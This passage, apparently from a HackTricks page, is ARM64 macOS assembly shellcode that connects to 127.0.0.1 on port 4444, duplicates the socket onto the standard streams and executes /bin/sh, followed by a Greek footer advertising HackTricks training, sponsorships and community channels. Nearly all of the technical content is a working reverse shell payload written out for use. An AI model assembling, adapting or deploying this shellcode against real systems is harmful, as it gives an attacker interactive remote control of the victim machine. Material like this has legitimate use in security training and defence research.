*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
